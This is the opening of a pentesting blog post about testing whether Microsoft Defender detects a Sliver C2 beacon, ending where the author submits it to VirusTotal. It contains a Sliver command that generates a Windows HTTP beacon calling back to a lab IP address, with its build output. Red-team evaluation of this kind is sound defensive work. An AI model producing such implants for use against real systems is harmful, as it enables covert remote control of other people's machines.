---
layout: single
title: "Breaking into Windows: Attempting to bypass EDR with Sliver"
excerpt: "How well does Microsoft Defender defend against a modified Sliver implant? I intend to answer that question by using common techniques used to bypass EDR to evaluate its detection and response capabilities under realistic attack scenarios."
date: 2024-05-28
header:
  teaser: /assets/images/BrokenWindows.png
  teaser_home_page: true
categories:
  - pentesting
tags:
  - pentesting
  - Bypass EDR
  - tools
---

![](/assets/images/BrokenWindows.png#center)

## Background

Sliver C2 is a pretty awesome alternative to metasploit developed by Bishop Fox:

> Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. Sliver's implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys.

You can create both a beacon and an implant.
Im going to be using a beacon as it is alot stelthier:
    
    $ sliver > generate beacon --http 192.168.56.1 --os windows --arch amd64 --format exe
    
    [*] Generating new windows/amd64 beacon implant binary (1m0s)
    [*] Symbol obfuscation is enabled
    [*] Build completed in 16s
    [*] Implant saved to /home/cleck/MODERN_MIDWIFE.exe

If we throw this into virus total we get: